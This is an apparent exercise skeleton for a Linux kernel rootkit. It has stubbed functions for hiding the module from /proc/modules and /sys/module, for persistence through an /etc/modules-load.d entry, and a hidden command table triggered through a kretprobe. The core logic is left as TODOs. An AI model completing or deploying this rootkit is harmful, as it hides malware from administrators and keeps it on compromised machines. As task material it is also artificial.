// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/fs.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/module.h>
#include <linux/workqueue.h>

/* Module hiding: remove/restore THIS_MODULE from both inventories */

static struct list_head *saved_prev;
static struct kobject *saved_parent;

void rk_module_hide(void)
{
	// TODO 1: hide the module from both /proc/modules and /sys/module
}

void rk_module_unhide(void)
{
	// TODO 2: restore the module to both inventories exactly once
}

/*
 * Persistence: write/clear /etc/modules-load.d entry.
 *
 * These run on the system workqueue (process context) because
 * filp_open and kernel_write can sleep. The command handlers that
 * trigger them run from kretprobe entry, where preemption is disabled.
 */

static void do_persist(struct work_struct *w)
{
	// TODO 3: replace the autoload file with the module name and a newline
}

static void do_unpersist(struct work_struct *w)
{
	// TODO 4: clear the autoload file
}

static DECLARE_WORK(persist_work, do_persist);
static DECLARE_WORK(unpersist_work, do_unpersist);

/* Command handlers */

static int cmd_persist(const char *arg) { schedule_work(&persist_work); return 0; }
static int cmd_unpersist(const char *arg) { schedule_work(&unpersist_work); return 0; }
static int cmd_hide_module(const char *arg) { rk_module_hide(); return 0; }
static int cmd_unhide_module(const char *arg) { rk_module_unhide(); return 0; }

static const struct rk_cmd_entry module_cmds[] = {
	{ "persist",   cmd_persist },
	{ "unpersist", cmd_unpersist },
	{ "h.m",       cmd_hide_module },
	{ "u.m",       cmd_unhide_module },
};

int rk_module_cmds_init(void)
{
	return rk_cmds_register(module_cmds, ARRAY_SIZE(module_cmds));
}
